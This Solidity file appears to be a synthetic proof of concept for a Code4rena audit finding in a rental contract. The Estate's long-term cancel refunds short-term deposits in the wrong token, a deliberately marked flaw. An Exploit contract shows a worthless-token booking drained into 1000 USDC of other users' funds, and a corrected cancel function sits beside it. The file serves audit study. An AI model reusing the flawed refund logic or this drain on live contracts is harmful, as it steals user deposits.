// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

/*  Coded Estate — long-term cancel refunds the long-term denom
    (Code4rena / nnez, AuditVault 45191).
    SYNTHETIC, cheatcode-free. Short and long rentals share one vector and
    cancel ignores rental_type. The report: pay 1000 useless-coin for a
    one-day short rental, cancel through the long-term function, receive
    1000 USDC. The contract was holding 10000 USDC from other users.
    A cancel that refunds the rental's own denom returns the useless coin. */

contract Coin {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Estate {
    struct Listing {
        address denom;
        uint256 pricePerDay;
    }

    struct Rental {
        address denom;
        uint256 depositAmount;
        bool rentalType;
        address tenant;
        uint256 startTime;
        uint256 endTime;
    }

    Listing public shortTerm;
    Listing public longTerm;
    Rental[] public rentals;
    mapping(address => uint256) public accounted;

    function setListForShortTerm(address denom, uint256 pricePerDay) external {
        shortTerm = Listing(denom, pricePerDay);
    }

    function setListForLongTerm(address denom, uint256 pricePerMonth) external {
        longTerm = Listing(denom, pricePerMonth);
    }

    function seed(address denom, uint256 amount) external {
        accounted[denom] += amount;
    }

    function setReservationForShortTerm(uint256 startTime, uint256 endTime) external {
        require(endTime > startTime, "period");
        uint256 days_ = (endTime - startTime) / 86400;
        uint256 rent = shortTerm.pricePerDay * days_;
        Coin(shortTerm.denom).transferFrom(msg.sender, address(this), rent);
        accounted[shortTerm.denom] += rent;
        rentals.push(
            Rental({
                denom: shortTerm.denom,
                depositAmount: rent,
                rentalType: false,
                tenant: msg.sender,
                startTime: startTime,
                endTime: endTime
            })
        );
    }

    function cancelReservationBeforeApprovalForLongTerm(uint256 startTime, uint256 endTime) external {
        uint256 count = rentals.length;
        uint256 position = type(uint256).max;
        uint256 amount;
        for (uint256 i = 0; i < count; i++) {
            Rental memory item = rentals[i];
            if (item.tenant == msg.sender && item.startTime == startTime && item.endTime == endTime) {
                position = i;
                amount = item.depositAmount;
            }
        }
        require(position != type(uint256).max, "not reserved");
        rentals[position] = rentals[count - 1];
        rentals.pop();
        address denom = longTerm.denom;
        // @> VULN: the short-term deposit is refunded in the long-term denom.
        Coin(denom).transfer(msg.sender, amount);
        accounted[denom] -= amount;
    }

    function cancelInBookedDenom(uint256 startTime, uint256 endTime) external returns (address denom, uint256 amount) {
        uint256 count = rentals.length;
        uint256 position = type(uint256).max;
        for (uint256 i = 0; i < count; i++) {
            Rental memory item = rentals[i];
            if (item.tenant == msg.sender && item.startTime == startTime && item.endTime == endTime) {
                position = i;
                amount = item.depositAmount;
                denom = item.denom;
            }
        }
        require(position != type(uint256).max, "not reserved");
        rentals[position] = rentals[count - 1];
        rentals.pop();
        Coin(denom).transfer(msg.sender, amount);
        accounted[denom] -= amount;
    }
}

contract Exploit {
    uint256 public constant START = 1_700_000_000;
    uint256 public constant END = 1_700_000_000 + 86400;

    Coin public junk;
    Coin public usdc;
    Estate public estate;
    uint256 public usdcGain;
    uint256 public usdcLeft;
    uint256 public fairUsdcLeft;

    constructor() {
        junk = new Coin();
        usdc = new Coin();
        estate = new Estate();
        junk.mint(address(this), 1000);
        usdc.mint(address(estate), 10_000);
        estate.seed(address(usdc), 10_000);
        junk.approve(address(estate), 1000);
    }

    function run() external {
        estate.setListForShortTerm(address(junk), 1000);
        estate.setListForLongTerm(address(usdc), 1000);
        estate.setReservationForShortTerm(START, END);
        require(junk.balanceOf(address(estate)) == 1000, "junk paid");
        require(usdc.balanceOf(address(estate)) == 10_000, "usdc still there");
        estate.cancelReservationBeforeApprovalForLongTerm(START, END);
        usdcGain = usdc.balanceOf(address(this));
        usdcLeft = usdc.balanceOf(address(estate));
        fairUsdcLeft = 10_000;
        require(usdcGain == 1000, "refunded 1000 USDC");
        require(usdcLeft == 9000, "other deposits reduced");
        require(junk.balanceOf(address(this)) == 0, "junk was not returned");
        require(usdcGain != 0, "no harm");
    }
}
